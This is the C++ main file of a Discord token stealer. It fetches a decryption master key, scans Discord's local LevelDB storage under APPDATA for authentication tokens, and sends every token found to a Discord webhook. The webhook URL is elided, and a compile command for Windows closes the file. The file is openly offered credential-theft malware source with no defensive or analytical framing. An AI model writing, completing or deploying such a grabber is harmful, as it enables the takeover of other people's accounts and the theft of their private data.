#include "Discord/Discord.h"
#include "grab.h"
#include <iostream>
#include "Windows.h"

int main() {
        auto masterKey = getMasterKey();
        if (masterKey.empty()) {
                std::cout << "Failed to get master key\n";
                return 1;
        }

        std::string ldbPath = std::string(getenv("APPDATA")) + "\\discord\\Local Storage\\leveldb";
        auto tokens = scanLevelDB(ldbPath, masterKey);

        const std::string webhookUrl = "...";
        DiscordWebhook webhook(webhookUrl);

        std::string tokenList;
        for (const auto& token : tokens)
                tokenList += token + "\n";

        webhook.setContent(tokenList.empty() ? "No tokens found." : tokenList);
        webhook.execute();

        return 0;
}

// g++ main.cpp grab.cpp Discord/Discord.cpp -o main -lcrypt32 -lssl -lcrypto -lwinhttp
